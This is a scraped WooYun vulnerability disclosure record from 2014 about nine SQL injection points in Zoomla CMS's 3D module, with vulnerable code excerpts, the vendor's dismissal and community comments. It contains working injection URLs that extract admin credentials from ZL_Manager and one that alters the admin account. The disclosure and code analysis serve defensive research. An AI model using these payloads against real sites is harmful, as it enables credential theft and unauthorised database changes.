{"id": 2401, "wybug_id": "wooyun-2014-060149", "wybug_title": "逐浪CMS一个文件夹9款注入姿势影响版本cms4.1 CMS2_x1.5 CMS6.0 CMS2_x1.4正式版", "wybug_corp": "逐浪CMS", "wybug_author": "Damo", "wybug_date": "2014-05-10 22:49", "wybug_open_date": "2014-08-05 22:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-11：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-05：\t细节向公众公开  简要描述： 影响版本Zoomla!cms4.1源码Zoomla!CMS2_x1.5源码 Zoomla!CMS6.0 Zoomla!逐浪CMS2_x1.4正式版此文件夹注入点蛮多的 厂商需努力呀 详细说明：  文件目录3D注入1文件/3D/1sMail.aspx   问题阐述 ShopID测试：\nhttp://192.168.10.19:9992/3d/sMail.aspx?ShopID=1000000 union/**/ all select/**/  1,2,'3','4','5','6','7','8','9',STUFF(adminPassword , 1, 0, AdminName),11,GETDATE(),13,14,15,GETDATE(),17,18,GETDATE(),20,'21','22' FROM ZL_Manager\n代码片段如下\nif (base.Request.QueryString[\"ShopID\"] != null)\t\t{\t\t\tstring text = base.Request.QueryString[\"ShopID\"].ToString();\t\t\tthis.HiddenField2.Value = text;\t\t\tDataTable dataTable = this.bdu.Select_Where(\" Dutype=1 and DuShow=\" + text, \" * \", \"\");\t\t\tif (dataTable.Rows.Count <= 0)\t\t\t{\t\t\t\tbase.Response.Write(\"<script>alert('error');location.href='Default.aspx'</script>\");\t\t\t\treturn;\t\t\t}\t\t\tthis.txtSend.Text = dataTable.Rows[0][\"DEmail\"].ToString();\t\t}\n虽然 Select_Where方法调用的存储过程进行了参数化 但是咱们看如下代码片段\npublic DataTable Select_Where(string strSQL, string strSelect, string Orderby){\tstring cmdText = \"PR_Duser_Select_Where\";\tSqlParameter[] array = new SqlParameter[3];\tarray[0] = new SqlParameter(\"@WhereCondition\", SqlDbType.NVarChar, 500);\tarray[0].Value = strSQL;\tarray[1] = new SqlParameter(\"@SelectCondition\", SqlDbType.NVarChar, 500);\tarray[1].Value = strSelect;\tarray[2] = new SqlParameter(\"@OrderByExpression\", SqlDbType.NVarChar, 250);\tarray[2].Value = Orderby;\treturn SqlHelper.ExecuteTable(CommandType.StoredProcedure, cmdText, array);}\n看存储过程 PR_Duser_Select_Where  \nSET @SQL = 'SELECT\t' + @SelectCondition + 'FROM\t[dbo].[ZL_Duser]WHERE\t' + @WhereConditionIF @OrderByExpression IS NOT NULL AND LEN(@OrderByExpression) > 0BEGIN\tSET @SQL = @SQL + 'ORDER BY\t' + @OrderByExpressionEND\n显然程序中的参数化没起到任何作用  结果如下图\n\n注：此处还有一个地方有注入（未利用）就是页面的DropDownList3下拉菜单的下拉事件代码片段如下\nprotected void DropDownList3_SelectedIndexChanged(object sender, EventArgs e)\t{\t\tswitch (this.DropDownList2.SelectedIndex)\t\t{\t\tcase 0:\t\t\tthis.GetUserData(this.mmbll.GetSend());\t\t\treturn;\t\tcase 1:\t\tcase 2:\t\t\tthis.GetUserData(this.mmbll.GetABC(this.DropDownList3.SelectedValue, \"1\"));\t\t\treturn;\t\tcase 3:\t\tcase 4:\t\tcase 5:\t\t\tbreak;\t\tcase 6:\t\t\tthis.GetUserData(this.mmbll.GetSubscribe(this.DropDownList3.SelectedValue, \"1\"));\t\t\tbreak;\t\tdefault:\t\t\treturn;\t\t}\t}\n这里直接获取的this.DropDownList3.SelectedValue的值此值可在UI中修改 GetABC方法代码片段如下\npublic DataTable GetABC(string str, string state)\t\t{\t\t\tstring str2 = \"\";\t\t\tif (!string.IsNullOrEmpty(state))\t\t\t{\t\t\t\tstr2 = \" and State='\" + state + \"'\";\t\t\t}\t\t\treturn this.Select_Wheres(\" Email like '\" + str + \"%' \" + str2, \" * \", \"  AddTime desc\");\t\t}\n虽然页面中未显示DropDownList3这个控件页未成功利用 但是这个地方代码 希望官方还是能修改一下注入2：    文件/3D/ShowForm.aspx  问题参数shopid测试：\nhttp://192.168.1.107:8885/3d/ShowForm.aspx?shopid=1000 union/**/ all select/**/  1,2,'3','4','5','6','7','8','9',STUFF(adminPassword , 1, 0, AdminName),11,GETDATE(),13,14,15,GETDATE(),17,18,GETDATE(),20,'21','22' FROM ZL_Manager\n    如下代码片段 \nif (base.Request.QueryString[\"ShopID\"] != null)\t\t{\t\t\tDataTable dataTable = new DataTable();\t\t\tthis.shopid = base.Request.QueryString[\"ShopID\"].ToString();\t\t\tthis.Hiddenshopid.Value = this.shopid;\t\t\tdataTable = this.bdu.Select_Where(\" Dutype=1 and DuShow=\" + this.shopid, \" * \", \"\");\t\t\tif (dataTable.Rows.Count <= 0)\t\t\t{\t\t\t\tDataTable dataTable2 = this.bdsbll.Select_Where(\"D_ShowUserid=\" + this.bubll.GetLogin().UserID.ToString(), \"*\", \"\");\t\t\t\tint dShowUserID = DataConverter.CLng(dataTable2.Rows[0][\"D_sid\"]);\t\t\t\tif (dataTable2.Rows.Count > 0)\t\t\t\t{\t\t\t\t\tM_DShowUser select = this.bdsbll.GetSelect(dShowUserID);\t\t\t\t\tselect.D_ShopID = 0;\t\t\t\t\tselect.D_Remark = \"\";\t\t\t\t\tselect.D_ShowX += 2;\t\t\t\t\tselect.D_ShowY += 2;\t\t\t\t\tselect.DupdateTime = DateTime.Now;\t\t\t\t\tthis.bdsbll.GetUpdate(select);\t\t\t\t}\t\t\t\tbase.Response.Write(\"<script>alert('对不起！商店还没有参展商！');window.history.go(-1);</script>\");\t\t\t}\n还是Select_Where方法出现问题还是和第一个注入过程是一样的调取的存储过程也是一样的\n\n注入3：文件 3d/InDoor.aspx 也就是showform。aspx中嵌入的的页面http://192.168.10.19:9992/3d/InDoor.aspx?ShopID=100;update/**/ ZL_Manager set AdminName='WooyunDamo' where/**/ AdminID=1--同样执行的同一个存储过程结果如下图\n\n注入4文件：3d/InsertContext.aspx?type=Suser个人原因 没有继续 但是看代码\nif (base.Request.QueryString[\"type\"] != null)\t\t{\t\t\tthis.md.Caddtime = DateTime.Now;\t\t\tthis.md.Cadduser = this.user.GetLogin().UserName;\t\t\tstring text = base.Request.Form.ToString();\t\t\ttext = base.Server.UrlDecode(text);\t\t\ttry\t\t\t{\t\t\t\ttext = BaseClass.FromBase64String(text);\t\t\t}\t\t\tcatch (Exception ex)\t\t\t{\t\t\t\ttext = ex.ToString() + text;\t\t\t}\t\t\tif (text.IndexOf(\"$\") > -1)\t\t\t{\t\t\t\tstring[] array = text.Split(new char[]\t\t\t\t{\t\t\t\t\t'$'\t\t\t\t}, StringSplitOptions.RemoveEmptyEntries);\t\t\t\tif (base.Request.QueryString[\"type\"].ToString() == \"Suser\")\t\t\t\t{\t\t\t\t\tDataTable dataTable = this.bduser.Select_Where(\" Dutype=1 and DuShow=\" + array[1], \" * \", \"\");\t\t\t\t\tif (dataTable.Rows.Count > 0)\t\t\t\t\t{\t\t\t\t\t\tthis.md.Ctouid = DataConverter.CLng(dataTable.Rows[0][\"DUid\"].ToString());\t\t\t\t\t}\t\t\t\t\tthis.dt = this.bduser.Select_Where(\" Duid=\" + this.md.Ctouid, \" * \", \"\");\t\t\t\t\tif (this.dt.Rows.Count > 0 && this.mduser.Dislogin == 0)\t\t\t\t\t{\t\t\t\t\t\tthis.mduser.Dmessage = this.mduser.Dmessage + 1;\t\t\t\t\t}\t\t\t\t}\nYY的想法：测试方式 form提交  然后转码 base.Server.UrlDecode(text);  然后FromBase64String(text);解码 然后解码之后的数据应该是介个样子的  理论数据  aaaa$bbbbb$ccccc$ddddd  然后代码过程则是根据$进行截取并且去除$  那么这里控制array[1]  页就是bbbbb的值即可完成注入   调取的还是原来的方法  还是熟悉的存储过程  小弟本地未亲测  但是这个地方代码 希望官方还是能修改一下注入5：\t文件3D/showBgRe.aspx\thttp://192.168.10.19:9992/3d/showBgRe.aspx?scen=100&ShopID=100 union/**/ all select/**/  STUFF(adminPassword , 1, 0, AdminName),2,'3','4','5','6','7','8','9','aa',11,GETDATE(),13,14,15,GETDATE(),17,18,GETDATE(),20,'21','22' FROM ZL_Manager\t还是原来的方法 还是熟悉的存储过程\t结果如下图\n\n注入6：   文件 3D/ShowChat.aspxhttp://192.168.10.19:9992/3d/ShowChat.aspx?type=2&uid=100 union/**/ all select/**/  STUFF(adminPassword , 1, 0, AdminName),2,'3','4','5','6','7','8','9','aa',11,GETDATE(),13,14,15,GETDATE(),17,18,GETDATE(),20,'21','22' FROM ZL_Manager\t还是原来的方法 还是熟悉的存储过程\t结果如下图\n\n注入7：\t文件3D/ShowInfo.aspx 问题参数 ShopID\thttp://192.168.10.19:9992/3d/ShowInfo.aspx?ShopID=100 union/**/ all select/**/  STUFF(adminPassword , 1, 0, AdminName),2,'3','4','5','6','7','8','9','aa',11,GETDATE(),13,14,15,GETDATE(),17,18,GETDATE(),20,'21','22' FROM ZL_Manager\t还是原来的方法 还是熟悉的存储过程\t图只是用来显示密码用的给WOOYUN省空间就不上传了 注入8：\t文件3D/ShowNote.aspx 问题参数 ShopID\thttp://192.168.10.19:9992/3d/ShowNote.aspx?ShopID=100 union/**/ all select/**/  STUFF(adminPassword , 1, 0, AdminName),2,'3','4','5','6','7','8','9','aa',11,GETDATE(),13,14,15,GETDATE(),17,18,GETDATE(),20,'21','22' FROM ZL_Manager\t还是原来的方法 还是熟悉的存储过程\t图只是用来显示密码用的给WOOYUN省空间就不上传了 注入9：\t文件3D/UpdateCoordinate.aspx \t代码片段如下 \tif (base.Request.QueryString[\"type\"] == \"shopuser\")\t\t\t{\t\t\t\tthis.ShopUser(base.Request.Form.ToString());\t\t\t\tthis.UpdateDate();\t\t\t}\tprivate void ShopUser(string shopid)\t{\t\t\t\tif (shopid != \"\")\t\t{\t\t\tDataTable dataTable = this.bds.Select_Where(\" D_ShopID=\" + shopid, \" D_ShowUserid, D_Remark\", \"\");\t\t\tstring str = \"false\";\t\t\tStringBuilder stringBuilder = new StringBuilder();\t\t\tif (dataTable.Rows.Count > 0)\t\t\t{\t\t\t\t.........\t\t\t\t}\t\t}\t} YY想法：\t问题方法Select_Where  存储过程 PR_DShowUser_Select_Where  利用方法还是一样 不过这次注意参数是Request.Form.ToString()   漏洞证明：  已经在上图了   修复方案：  解决方案  从方法入手（参数化） 存储过程入手（显然贵司这个地方出了问题）\t从人猿入手  照屁股使劲打   版权声明：转载请注明来源 Damo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-08-05 22:50 厂商回复： 感谢反馈，此模板为特别订制模块，本不应在发布之列，亦非开放模块，遂决定剔除之。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-10 23:00 |    \t\twhat_news \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:48        | 小菜一个 希望成为大菜)\t\t \n  大牛    \n     2014-05-11 03:03 |    \t\t大师哥 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | I am the government)\t\t \n  洞主有9种方法日进去！9种~~。 这种强烈的即视感是怎么回事。。。    \n     2014-05-12 09:32 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  被忽略了。    \n     2014-05-12 09:42 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @逐浪CMS @wefgod  忽略其实也没关系，其实厂商可以这样做 1、不该发布的在发布前做好处理 2、既然程序已经发布出来了,可能已经有用户下载并且使用，还是希望厂商略微重视下  另外既然在@wooyun中注册厂商 那么还是希望能略微尊重一下小白帽的辛苦。看厂商的洞很多都忽略总免不了让人有“谁让你不买我的正版CMS”的嫌疑    \n     2014-05-12 09:59 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Damo 他们每次都这样的。我已经经历很多次了    \n     2014-05-12 10:05 |    \t\twhat_news \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:48        | 小菜一个 希望成为大菜)\t\t \n  @Damo @wefgod 我最近提交三个才确定一个 忽略一个 一个那么早提交的现在还没确定 感觉有点坑了 不再爱了    \n     2014-05-12 10:24 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @what_news 我只能说我经历过了，你不见我后面都不提交了啊    \n     2014-05-12 11:17 |    \t\twhat_news \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:48        | 小菜一个 希望成为大菜)\t\t \n  @wefgod 只是看到最近产家变积极了才提的 不像你以前提的时候那样 又坑爹了    \n     2014-05-28 11:30 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  我靠，那么多问题大合集啊！很给力，union的好啊，那个参数化查询也分析的好。不过官方这态度………………    \n     2014-05-28 16:08 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  虽然 Select_Where方法调用的存储过程进行了参数化 看了看洞主的文章，这个参数化只是作为存储过程的input而已，和真正的where userid=@userid之类的“参数化”是不一样的，具体为什么，请仔细看看某个SQL文件，仅靠你给的这部分代码，是判断不了的。    \n     2014-05-28 16:15 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  嗯说复杂，简单说就是框架有问题，他这个存储过程压根就不是打算防SQL注入的！    \n     2014-08-06 13:40 |    \t\t纠结师 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:12        | 传说中的废材)\t\t \n  @乌云 最近图片什么情况。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}